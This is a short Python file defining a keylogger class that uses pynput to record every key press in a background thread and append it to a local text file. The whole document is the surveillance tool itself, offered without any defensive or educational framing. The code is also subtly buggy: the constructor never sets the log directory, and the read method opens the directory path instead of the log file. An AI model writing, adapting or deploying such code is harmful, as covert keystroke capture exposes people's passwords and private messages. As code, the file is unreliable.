import pynput
import threading


class KeyLogger:
    __log_dir = ""
    def __init__(self, log_dir=None) -> None:
        if log_dir is not None:
            __log_dir = log_dir
    
    def __on_press(self, key) -> None:
        with open(KeyLogger.__log_dir + "key_logs.txt", "a") as f:
            f.write(str(key) + ' ')

    def __main_loop(self):
        with pynput.keyboard.Listener(on_press=self.__on_press) as listener:
            listener.join()
    
    def start(self):
        try:
            threading.Thread(target=(self.__main_loop)).start()
        except Exception as err:
            return(err)

    def get_keylogs(self):
        with open(self.__log_dir, "r") as f:
            logs = f.read()
        return logs